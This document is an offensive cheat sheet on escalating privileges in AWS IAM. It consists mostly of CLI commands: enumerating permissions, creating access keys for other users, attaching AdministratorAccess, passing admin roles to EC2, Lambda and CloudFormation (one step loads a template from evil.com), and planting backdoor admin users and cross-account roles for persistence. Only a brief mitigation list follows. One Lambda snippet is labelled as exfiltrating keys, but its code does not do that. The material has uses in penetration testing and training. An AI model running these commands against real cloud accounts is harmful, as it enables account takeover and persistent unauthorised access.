# AWS IAM Privilege Escalation Paths

Common IAM misconfigurations that allow privilege escalation in AWS.

## Initial Recon

```bash
# Who am I?
aws sts get-caller-identity

# What can I do?
aws iam list-attached-user-policies --user-name myuser
aws iam list-user-policies --user-name myuser
aws iam get-policy --policy-arn arn:aws:iam::123:policy/MyPolicy
aws iam get-policy-version --policy-arn arn:aws:iam::123:policy/MyPolicy --version-id v1

# Check for inline policies
aws iam list-user-policies --user-name myuser
aws iam get-user-policy --user-name myuser --policy-name MyInline

# What roles can I assume?
aws iam list-roles
```

## Escalation Paths

### 1. iam:CreateAccessKey (on other users)

```bash
# If you have iam:CreateAccessKey on another user
aws iam create-access-key --user-name admin-user
# Now you have admin-user's credentials
```

### 2. iam:AttachUserPolicy

```bash
# Attach AdministratorAccess to yourself
aws iam attach-user-policy --user-name myuser   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 3. iam:PutUserPolicy

```bash
# Create inline policy granting all actions
aws iam put-user-policy --user-name myuser --policy-name privesc --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
}'
```

### 4. iam:PassRole (to services)

```bash
# Pass an admin role to a new EC2 instance
aws iam list-roles --query 'Roles[?contains(RoleName, `admin`)]'
aws ec2 run-instances --image-id ami-xxxx   --instance-type t2.micro   --iam-instance-profile Name=admin-role
# SSH into the instance, use metadata to get role creds
```

### 5. sts:AssumeRole (on privileged roles)

```bash
# If you can assume a more privileged role
aws sts assume-role --role-arn arn:aws:iam::123:role/AdminRole   --role-session-name privesc
```

### 6. lambda:CreateFunction + iam:PassRole

```bash
# Create a Lambda with an admin role
aws lambda create-function --function-name privesc   --runtime python3.9 --role arn:aws:iam::123:role/admin-role   --handler index.handler --zip-file fileb://lambda.zip

# Lambda code that exfiltrates keys
cat > index.py << 'EOF'
import boto3, json
def handler(event, context):
    sts = boto3.client('sts')
    return sts.get_caller_identity()
EOF

aws lambda invoke --function-name privesc output.json
cat output.json
```

### 7. PassRole to CloudFormation

```bash
# Create a CF stack that creates an admin user
aws cloudformation create-stack --stack-name privesc   --template-url https://evil.com/template.yaml   --role-arn arn:aws:iam::123:role/admin-role   --capabilities CAPABILITY_NAMED_IAM
```

## Automated Tools

```bash
# Pacu (AWS exploitation framework)
pacu
import modules
run iam__privesc_scan

# CloudGoat (vulnerable scenarios)
./cloudgoat.py config profile
./cloudgoat.py scenario iam_privesc

# ScoutSuite (auditing)
scout aws --profile compromised

# enumerate-iam
python3 enumerate-iam.py --access-key AKIA... --secret-key ...
```

## Persistence After Escalation

```bash
# Create backdoor user
aws iam create-user --user-name backup
aws iam attach-user-policy --user-name backup   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backup

# Create backdoor role with trust policy allowing external account
aws iam create-role --role-name cross-account   --assume-role-policy-document file://trust.json
```

## Mitigation

- Follow least privilege principle
- Use permission boundaries on roles
- Monitor CloudTrail for IAM API calls
- Set up AWS Config rules for IAM changes
- Use SCPs (Service Control Policies) in Organizations
- Regularly audit with IAM Access Analyzer
